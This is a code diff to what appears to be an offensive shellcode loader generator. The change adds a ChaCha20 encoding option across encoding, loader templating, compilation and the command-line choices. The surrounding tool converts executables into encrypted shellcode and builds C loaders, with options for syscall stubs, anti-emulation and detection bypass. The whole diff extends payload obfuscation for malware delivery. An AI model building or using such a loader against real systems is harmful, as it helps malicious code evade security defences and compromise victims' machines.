@@ -149,6 +149,8 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
             cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'aes2':
             cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
+        elif encoding == 'chacha':
+            cmd = ['python3', './encoders/bin2chacha.py', output_path_bin, '>', encoding_output_path]
         subprocess.run(' '.join(cmd), shell=True, check=True)
         output_path = encoding_output_path   
         print(f"[+] Shellcode encoded with {encoding} and saved to: {output_path}")
@@ -288,6 +290,8 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
             include_header = '#include "aes_converter.h"\n'
         elif encoding == 'aes2':
             include_header = '#include "aes2_converter.h"\n'
+        elif encoding == 'chacha':
+            include_header = '#include "chacha_converter.h"\n'
         else:
             # Default to uuid if not specified for backward compatibility
             include_header = '#include "uuid_converter.h"\n'
@@ -402,6 +406,20 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
         DecryptAES((char*)magiccode, aes_length, AESkey, sizeof(AESkey));
 
         printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
+        """
+        elif encoding == 'chacha':
+            encoding_declaration_index = content.find('unsigned char magiccode[]')
+            conversion_logic_template = """
+    int lenMagicCode = sizeof(magic_code);
+
+    unsigned char magiccode[lenMagicCode];
+
+    test_decryption();
+
+    chacha20_encrypt(magiccode, magic_code, lenMagicCode, CHACHA20key, CHACHA20nonce, 1);
+
+    // print_decrypted_result(magiccode, lenMagicCode);
+    printf("\\n");
         """
         elif encoding == 'aes2':
             encoding_declaration_index = content.find('unsigned char magiccode[]') 
@@ -661,6 +679,8 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         compile_command.append('./converter/base58_converter.c')
     elif encoding == 'aes': 
         compile_command.append('./converter/aes_converter.c')
+    elif encoding == 'chacha':
+        compile_command.append('./converter/chacha_converter.c')
     elif encoding == 'aes2':
         compile_command.append('./converter/aes2_converter.c')
     if dream:
@@ -721,6 +741,8 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
             additional_sources.append('./converter/base58_converter.c')
         elif encoding == 'aes':
             additional_sources.append('./converter/aes_converter.c')
+        elif encoding == 'chacha':
+            additional_sources.append('./converter/chacha_converter.c')
         elif encoding == 'aes2':
             additional_sources.append('./converter/aes2_converter.c')
         elif encoding == 'rc4':
@@ -955,7 +977,7 @@ def main():
     parser.add_argument('-sgn', '--encode-sgn', action='store_true', help='Encode the generated shellcode using sgn tool.')
 
     ## TODO: Add support for other encoding types
-    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base64', 'base58', 'aes', 'aes2'], help='Encoding type: uuid, xor, mac, ip4, base64, base58 AES and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')
+    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base64', 'base58', 'aes', 'chacha', 'aes2'], help='Encoding type: uuid, xor, mac, ip4, base64, base58 AES and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')
 
 
     parser.add_argument('-c', '--compiler', default='mingw', choices=['mingw', 'pluto', 'akira'], help='Compiler choice: mingw (default), pluto, or akira')
